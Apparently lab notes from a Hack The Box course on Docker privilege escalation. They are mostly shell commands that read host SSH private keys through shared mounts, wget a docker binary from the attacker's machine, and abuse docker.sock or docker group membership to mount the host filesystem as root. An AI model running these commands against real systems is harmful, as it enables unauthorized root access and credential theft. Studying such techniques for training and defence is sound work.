## Docker Privilege Escalation
#### Docker Shared Directories

```shell
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.

```shell
3kjS@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```
#### Docker Sockets

```shell
htb-student@container:~/app$ ls -al
```

```shell
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker 
htb-student@container:/tmp$ chmod +x docker 
htb-student@container:/tmp$ ls -l
```

```shell
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app 
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
```

```shell
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash 

root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa 

-----BEGIN RSA PRIVATE KEY----- 
<SNIP>
```
#### Docker Group

```shell
docker-user@nix02:~$ id 

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```
#### Docker Socket

```shell
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash 

root@ubuntu:~# ls -l
```
